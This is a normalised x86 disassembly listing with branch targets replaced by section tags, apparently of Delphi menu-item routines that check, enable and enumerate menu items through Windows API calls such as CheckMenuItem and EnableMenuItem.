mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45fa90
mov esi eax
mov eax edi
call sub_45f0ac
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4042f8
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b80
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403f84
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_45cbbc
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f311
lea eax [ ebp - 0x24 ]
call sub_403eec
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45daf8
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45f33c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4042f8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403f40
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f364
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45f4d4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45f4e4
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45f3ac
sub_45f3ac
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45da68
push eax
call CheckMenuItem
mov eax esi
call sub_45f364
sub_45f400
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45f4d4
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45da68
push eax
call EnableMenuItem
sub_45f478
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45f838
mov edx eax
mov ecx ebx
mov eax edi
call sub_45da08
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45f364
sub_45f4e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4182a8
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45cb10
sub_45f554
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_45f4d4
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45f53c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45f86c
mov ecx ebx
mov edx esi
mov eax edi
call sub_45f660
sub_45f59c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45f4d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45f4e4
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45f5f4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45f4d4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45f4e4
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45f4e4
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45f660
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_45cb10
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_45da08
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_418324
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45f8d8
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45f4d4
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45d938
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4182a8
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4182a8
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45f478
sub_45f714
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45cb10
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45f4d4
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45d938
mov eax ebx
call sub_45f4d4
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4182a8
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418198
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45f788
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45f3ac
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45f4bc
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45f4bc
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45f850
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45f4d4
mov edx eax
mov ecx esi
mov eax ebx
call sub_45f660
pop esi
pop ebx
retn
sub_45f86c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45f838
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45f714
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45cb10
sub_45f894
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45f8d8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45f8d8
jmp r-xdata
mov eax ebx
call sub_45d938
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4615b0
sub_45f930
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebx + 0x4c ] eax
sub_45f958
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403174
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45fbec
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403370
mov edx ebx
mov eax edi
call sub_420a98
mov eax ebx
mov si 0xffee
call sub_403370
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45f9c8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ esi + 0x4c ] eax
sub_45f9fc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45f4d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45f4e4
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45fa3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45f86c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45f850
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45f850
sub_45faa0
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45f364
sub_45facc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45f33c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45f3ac
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_45f400
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403f40
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45f52c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45f478
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45f508
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45f51c
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45fbec
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45f4bc
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403370
sub_45fc10
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fc30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fc50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fc70
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fc90
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fcb0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fcd0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fcf0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fd10
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fd30
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c54
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_459fe4
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_45a11c
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_45a17c
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_459e7c
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_45a23c
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45fda8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420ce4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45f4bc
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45f958
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45fdfc
jmp r-xdata
xor edx edx
mov eax esi
call sub_45d8c0
sub_45fdfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_45b294
mov eax ebx
call sub_45fe6c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_45b2d8
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_420a98
sub_45fe44
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45fe44
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45cf94
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45f8d8
mov eax ebx
pop esi
pop ebx
retn
sub_45fe80
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c370
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_40444c
sub_45feb0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f84
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45ff34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_460056
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4041ac
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4041ac
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_40440c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042f8
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46005d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f10
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404494
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_40426c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4041ac
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_40440c
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_40426c
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_460094
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_460533
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403f84
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4604f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45f4d4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403f84
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46053a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f10
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f10
lea eax [ ebp - 0x18 ]
call sub_403eec
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax ebx
call sub_4606e8
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45f4e4
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042f8
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45feb0
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45f4e4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f4e4
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403174
mov eax [ ebp - 0x20 ]
call sub_403174
mov eax [ ebp - 0x14 ]
call sub_403174
mov eax [ ebp - 0xc ]
call sub_403174
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45feb0
pop ecx
mov eax [ ebp - 0x30 ]
